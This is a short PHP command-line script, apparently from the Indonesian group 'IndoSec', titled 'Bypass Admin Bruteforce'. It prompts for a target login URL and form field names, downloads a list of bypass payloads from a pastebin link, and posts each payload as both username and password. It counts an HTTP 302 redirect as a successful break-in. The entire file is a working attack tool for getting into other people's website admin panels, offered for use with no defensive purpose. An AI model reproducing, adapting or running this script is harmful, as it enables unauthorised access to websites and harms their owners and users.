<?php
$banner = "\e[36;1m                                                                                 
                                                                                 
           #         ######   
           #    #             
  ######   #    #  ########## 
           #    #  #        # 
           #######        ##  
##########      #       ##    
                #     ##      
                              
                                                                                 
[#] Bypass Admin Bruteforce [#]    
                                   
Coded by : Revan AR                  
Team   : IndoSec                   
Github : https//github.com/revan-ar/\n\n\e[0;1m";
echo $banner;
sleep(2);
echo ">>> URL POST : ";
$url = trim(fgets(STDIN));
sleep(2);
echo ">>> FORM USER NAME : ";
$username = trim(fgets(STDIN));
sleep(2);
echo ">>> FORM PASSWORD NAME : ";
$password = trim(fgets(STDIN));
sleep(2);
echo ">>> BUTTON SUBMIT NAME : ";
$submit = trim(fgets(STDIN));
$list = file_get_contents("https://pastebin.com/Quvi8Gsz");
$contourne = explode("\r\n", $list);

  // $x = curl_init();
  //      curl_setopt($x, CURLOPT_URL, "$url");
  //      curl_setopt($x, CURLOPT_RETURNTRANSFER, 1);
  //      curl_setopt($x, CURLOPT_HEADER, 1);
  //      curl_setopt($x, CURLOPT_POST, 1);
  //      curl_setopt($x, CURLOPT_POSTFIELDS, "$username=admiinn&$password=admiinn&$submit=1");
  //      $y = curl_exec($x);
  //      curl_exec($x);

echo "\nRESULTAT :\n\n";
foreach ($contourne as $query) {
	
  $ch = curl_init();
       curl_setopt($ch, CURLOPT_URL, "$url");
       curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
       curl_setopt($ch, CURLOPT_HEADER, 1);
       curl_setopt($ch, CURLOPT_POST, 1);
       curl_setopt($ch, CURLOPT_POSTFIELDS, "$username=$query&$password=$query&$submit=1");
       $asu = curl_exec($ch);
        curl_close($ch);

        preg_match("/HTTP\/1.1 302/i", $asu, $red);

       if (!empty($red)){
       	echo "{#} $query => Reussie\n";
       sleep(1);
       }else{
       	echo "{-} $query => Echec\n";
       sleep(1);
       }

}
?>
  
